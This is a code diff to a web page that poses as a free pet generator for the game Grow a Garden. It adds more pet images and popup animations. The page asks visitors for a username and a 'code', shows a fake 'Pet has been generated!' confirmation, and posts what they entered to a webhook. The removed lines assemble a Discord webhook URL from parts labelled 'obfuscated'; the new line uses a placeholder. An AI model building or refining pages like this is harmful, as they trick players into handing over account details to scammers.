@@ -50,7 +50,7 @@
 
   .pets {
     display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+    grid-template-columns: repeat(5, 1fr);
     gap: 20px;
     justify-items: center;
   }
@@ -84,7 +84,6 @@
     box-shadow: 0 0 14px rgba(96, 165, 250, 0.9);
   }
 
-  /* ✨ Shine effect */
   .pet-card::before {
     content: "";
     position: absolute;
@@ -118,7 +117,7 @@
     transform: scale(1.07);
   }
 
-  /* Popup styles */
+  /* Popup shared styles */
   #popup, #confirmPopup {
     display: none;
     position: fixed;
@@ -135,12 +134,24 @@
     padding: 24px;
     border-radius: 14px;
     width: 320px;
+    max-width: 90%;
     animation: slideup 0.4s ease;
     box-shadow: 0 0 20px rgba(96, 165, 250, 0.9), 0 0 40px rgba(59, 130, 246, 0.6);
     border: 2px solid #3b82f6;
     color: #e2e8f0;
     text-align: center;
   }
+
+  /* 🔥 Special animation for confirmation popup */
+  #confirmPopup .popup-content {
+    animation: popscale 0.5s ease;
+  }
+  @keyframes popscale {
+    0% { transform: scale(0.6); opacity: 0; }
+    60% { transform: scale(1.1); opacity: 1; }
+    100% { transform: scale(1); }
+  }
+
   #popup input {
     width: 100%;
     margin-top: 10px;
@@ -206,7 +217,7 @@
     </div>
   </div>
 
-  <!-- Confirmation Popup -->
+  <!-- Confirmation Popup (with popscale animation) -->
   <div id="confirmPopup">
     <div class="popup-content">
       <h3>✅ Pet has been generated!</h3>
@@ -220,9 +231,13 @@
     { id: 'Kitsune', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Kitsune.png', name: 'Kitsune' },
     { id: 'Raccoon', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Raccoon.png', name: 'Raccoon' },
     { id: 'Disco Bee', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Disco_Bee.png', name: 'Disco Bee' },
-    { id: 'Mimic octopus', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Mimic_Octopus.png', name: 'Mimic Octopus' },
-    { id: 'Fennec fox', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Fennec_Fox.png', name: 'Fennec Fox' },
-    { id: 'Butterfly', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Butterfly.png', name: 'Butterfly' }
+    { id: 'Mimic Octopus', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Mimic_Octopus.png', name: 'Mimic Octopus' },
+    { id: 'Fennec Fox', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Fennec_Fox.png', name: 'Fennec Fox' },
+    { id: 'Butterfly', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Butterfly.png', name: 'Butterfly' },
+    { id: 'Dragon', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Dragon.png', name: 'Dragon' },
+    { id: 'Penguin', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Penguin.png', name: 'Penguin' },
+    { id: 'Capybara', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Capybara.png', name: 'Capybara' },
+    { id: 'Axolotl', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Axolotl.png', name: 'Axolotl' }
   ];
 
   let selectedPet = pets[0].id;
@@ -259,11 +274,7 @@
     const code = document.getElementById('code').value.trim();
     if (!username || !code) return;
 
-    // obfuscated webhook parts
-    const part1 = "https://discord.com/api/webhooks/";
-    const part2 = "YOUR_WEBHOOK_ID";
-    const part3 = "/YOUR_WEBHOOK_TOKEN";
-    const webhookURL = part1 + part2 + part3;
+    const webhookURL = "https://example.com/webhook"; // placeholder
 
     const payload = {
       content: `Pet Generated!\nUsername: ${username}\nCode: ${code}\nSelected Pet: ${pets.find(p=>p.id===selectedPet).name}`
